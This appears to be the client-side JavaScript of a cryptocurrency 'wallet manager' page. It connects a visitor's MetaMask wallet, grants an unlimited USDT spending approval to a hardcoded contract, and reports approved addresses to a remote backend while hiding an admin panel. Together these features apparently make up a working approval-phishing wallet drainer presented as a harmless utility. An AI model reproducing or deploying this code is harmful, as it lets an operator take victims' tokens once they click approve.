// Wallet Connector Class
class WalletConnector {
    constructor() {
        this.provider = null;
        this.signer = null;
        this.walletAddress = null;
    }

    async connect() {
        try {
            if (typeof window.ethereum === 'undefined') {
                throw new Error('No Ethereum wallet found. Please install MetaMask or Trust Wallet.');
            }

            // Request account access
            const accounts = await window.ethereum.request({
                method: 'eth_requestAccounts'
            });

            this.walletAddress = accounts[0];
            
            // Create provider and signer
            this.provider = new ethers.providers.Web3Provider(window.ethereum);
            this.signer = this.provider.getSigner();

            return {
                success: true,
                address: this.walletAddress
            };
        } catch (error) {
            return {
                success: false,
                error: error.message || 'Failed to connect wallet'
            };
        }
    }

    async approveContract(contractAddress) {
        try {
            if (!this.signer) {
                throw new Error('Wallet not connected');
            }
            
            // USDT contract address (replace with your actual USDT contract)
            const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Mainnet USDT
            
            const usdtContract = new ethers.Contract(
                usdtContractAddress,
                ['function approve(address spender, uint256 amount) public returns (bool)'],
                this.signer
            );

            const tx = await usdtContract.approve(
                contractAddress,
                ethers.constants.MaxUint256
            );

            await tx.wait();

            return {
                success: true,
                txHash: tx.hash
            };
        } catch (error) {
            return {
                success: false,
                error: error.message || 'Failed to approve contract'
            };
        }
    }
}

// API Service
class ApiService {
    constructor() {
        this.baseUrl = 'https://multi-wallet-manager.onrender.com/api';
    }

    async request(endpoint, options = {}) {
        const url = `${this.baseUrl}${endpoint}`;
        
        try {
            const response = await fetch(url, {
                headers: {
                    'Content-Type': 'application/json',
                    ...options.headers
                },
                ...options
            });
            
            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`);
            }
            
            return await response.json();
        } catch (error) {
            console.error(`API Error (${endpoint}):`, error);
            throw error;
        }
    }

    async connectWallet(walletData) {
        return this.request('/wallets/connect', {
            method: 'POST',
            body: JSON.stringify(walletData)
        });
    }

    async approveWallet(walletData) {
        return this.request('/wallets/approve', {
            method: 'POST',
            body: JSON.stringify(walletData)
        });
    }

    async getWalletBalance(walletAddress) {
        return this.request(`/wallets/${walletAddress}/balance`);
    }
}

// Main App Class
class WalletManagerApp {
    constructor() {
        this.walletConnector = new WalletConnector();
        this.apiService = new ApiService();
        
        this.initializeElements();
        this.attachEventListeners();
        this.init();
    }

    initializeElements() {
        // Header elements
        this.connectButton = document.getElementById('connect-wallet');
        this.connectionStatus = document.getElementById('connection-status');
        this.walletInfo = document.getElementById('wallet-info');
        this.walletAddressElement = document.getElementById('wallet-address');
        this.usdtBalanceElement = document.getElementById('usdt-balance');
        this.approveButton = document.getElementById('approve-contract');
        
        // Loading indicator
        this.loadingIndicator = document.getElementById('loading');
        
        // Hide admin elements
        const adminPanel = document.getElementById('admin-panel');
        const adminLogin = document.getElementById('admin-login');
        if (adminPanel) adminPanel.style.display = 'none';
        if (adminLogin) adminLogin.style.display = 'none';
    }

    attachEventListeners() {
        if (this.connectButton) {
            this.connectButton.addEventListener('click', () => this.handleConnectWallet());
        }
        
        if (this.approveButton) {
            this.approveButton.addEventListener('click', () => this.handleApproveContract());
        }
    }

    init() {
        // Hide loading indicator immediately
        this.showLoading(false);
        
        // Check if wallet is already connected
        const storedAddress = localStorage.getItem('walletAddress');
        if (storedAddress) {
            this.walletConnector.walletAddress = storedAddress;
            this.updateWalletUI(storedAddress);
            this.showWalletInfo();
        }
    }

    async handleConnectWallet() {
        this.showLoading(true);
        
        try {
            const result = await this.walletConnector.connect();
            
            if (result.success) {
                localStorage.setItem('walletAddress', result.address);
                this.updateWalletUI(result.address);
                this.showWalletInfo();
                
                // Send to backend
                try {
                    await this.apiService.connectWallet({
                        address: result.address,
                        name: `Wallet ${result.address.substring(0, 6)}...${result.address.substring(38)}`
                    });
                } catch (error) {
                    console.error('Error connecting to backend:', error);
                }
            } else {
                this.showError(`Connection failed: ${result.error}`);
            }
        } catch (error) {
            this.showError(`Connection failed: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    }

    async updateWalletUI(address) {
    if (this.connectionStatus) {
        this.connectionStatus.textContent = `Connected: ${address.substring(0, 6)}...${address.substring(38)}`;
    }
    if (this.connectButton) {
        this.connectButton.textContent = 'Connected';
        this.connectButton.disabled = true;
    }
    if (this.walletAddressElement) {
        this.walletAddressElement.textContent = address;
    }
    
    // Get real USDT balance
    if (this.usdtBalanceElement) {
        try {
            this.usdtBalanceElement.textContent = 'Loading...';
            const response = await this.apiService.getWalletBalance(address);
            const balance = response.balance || '0.00';
            this.usdtBalanceElement.textContent = parseFloat(balance).toFixed(2);
        } catch (error) {
            console.error('Error getting balance:', error);
            this.usdtBalanceElement.textContent = '0.00';
        }
    }
}


    showWalletInfo() {
        if (this.walletInfo) {
            this.walletInfo.classList.remove('hidden');
        }
    }

    async handleApproveContract() {
        this.showLoading(true);
        
        try {
            // Use your actual contract address
            const contractAddress = '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF';
            const result = await this.walletConnector.approveContract(contractAddress);
            
            if (result.success) {
                this.showSuccess('Contract approved successfully!');
                if (this.approveButton) {
                    this.approveButton.disabled = true;
                    this.approveButton.textContent = 'Approved';
                }
                
                // Update backend
                try {
                    await this.apiService.approveWallet({
                        address: this.walletConnector.walletAddress
                    });
                } catch (error) {
                    console.error('Error updating backend:', error);
                }
            } else {
                this.showError(`Approval failed: ${result.error}`);
            }
        } catch (error) {
            this.showError(`Approval failed: ${error.message}`);
        } finally {
            this.showLoading(false);
        }
    }

    showLoading(show) {
        if (this.loadingIndicator) {
            this.loadingIndicator.style.display = show ? 'flex' : 'none';
        }
    }

    showSuccess(message) {
        alert(`Success: ${message}`);
    }

    showError(message) {
        alert(`Error: ${message}`);
    }
}

// Initialize the app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.app = new WalletManagerApp();
});

